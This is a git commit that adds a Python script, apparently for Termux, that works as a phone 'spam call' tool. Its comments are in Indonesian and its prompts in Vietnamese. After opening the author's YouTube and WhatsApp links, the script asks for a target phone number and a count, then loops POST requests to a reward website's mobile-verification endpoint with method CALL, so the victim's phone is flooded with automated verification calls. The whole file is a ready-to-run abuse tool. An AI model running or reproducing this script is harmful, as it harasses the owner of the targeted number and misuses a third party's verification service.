8a9387cb7e7b0f52d74f8895e3b801a756e154c3
BuildTools <unconfigured@null.spigotmc.org>
2022-05-23 07:08:45 +0700

    first commit

---
+++ cus.py
@@ -0,0 +1,60 @@
+# Mau gua Marshal kagak jadi
+# suberk dlu sebelum ngambil
+import os,sys,time,requests
+from time import sleep
+
+#mengetik otomatis
+def mengetik(z):
+    for e in z + "\n":
+      sys.stdout.write(e)
+      sys.stdout.flush()
+      time.sleep(0.02)
+
+os.system('clear')
+print ('\033[36;1mSubscribe yt ku ngab \033[37mMisterAM \033[36mok! :v')
+os.system('termux-open-url https://youtube.com/channel/UCXk4vbvDl7i6dxWBtNdpx6w')
+sleep(5)
+os.system('clear')
+print ('\033[36;1mJoin juga Grub \033[37;1mWA gua ngab :v')
+os.system('xdg-open https://cararegistrasi.com/5QxXfcSkSsm')
+sleep(3)
+os.system('clear')
+# Ubah Terserah kalian
+print ("")
+mengetik("\033[36;1m ███████╗██████╗  █████╗ ███╗   ███╗ \033[33;1m ╔██████╗ █████╗ ██╗     ██╗")
+mengetik("\033[36;1m ██╔════╝██╔══██╗██╔══██╗████╗ ████║ \033[33;1m ██╔════╝██╔══██╗██║     ██║")
+mengetik("\033[36;1m ███████╗██████╔╝███████║██╔████╔██║ \033[33;1m ██║     ███████║██║     ██║")
+mengetik("\033[37;1m ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║ \033[37;1m ██║     ██╔══██║██║     ██║")
+mengetik("\033[37;1m ███████║██║     ██║  ██║██║ ╚═╝ ██║ \033[37;1m ╚██████╗██║  ██║███████╗███████╗")
+mengetik("\033[37;1m ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[37;1m  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝")
+print ("")
+mengetik("\033[33;1m╔════════════════════════════════════════════════╗")
+mengetik("\033[33;1m║  \033[36;1m [•] Authour : MaVanDes                      \033[33;1m ║")
+mengetik("\033[33;1m║  \033[36;1m [•] gitHub  : https:github.com/MaVanDes     \033[33;1m ║")
+mengetik("\033[33;1m║  \033[36;1m [•] Yotube  : MaVanDes                      \033[33;1m ║")
+mengetik("\033[33;1m╚════════════════════════════════════════════════╝")
+print ("")
+mengetik("\033[36;1m╔═══════════════════════════╗")
+mengetik("\033[36;1m║\033[33;1m SỬ DỤNG WISE một cách cẩn thận\033[36;1m ║")
+mengetik("\033[36;1m╚═══════════════════════════╝")
+sleep(1)
+# Jaggan di ubah sayang
+print ("")
+mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m SỐ LỰA CHỌN \033[1;33m• \033[0m\033[1;30m]══════════════>")
+print ("")
+mengetik("\033[37m[\033[31m•\033[37m]\033[32m Số ví dụ\033[37m : \033[37m\033[33m+84Xxx\033[33m")
+nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Số mục tiêu\033[32m \033[37m:\033[37m\033[33m ")
+mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m NHẬP SỐ LƯỢNG \033[1;33m• \033[0m\033[1;30m]══════════════>")
+jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Tổng số thư rác\033[37m :\033[37m\033[33m "))
+mengetik("[setiap 3x spam ada jeda 15 menit ngab sabar ngab lu] ")
+time.sleep(3)
+print ("")
+# Jaggan di ubah sayang ku
+url = "https://id.jagreward.com/member/verify-mobile/"
+ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
+dat = {"method": "CALL","countryCode": "id",}
+# Jaggan di ubah sayng
+for i in range(jumlah):
+    send = requests.post(url+nomor, headers=ua, data=dat)
+    print(" [â€¢] Status ~+> ",(send.json()["message"]))
+
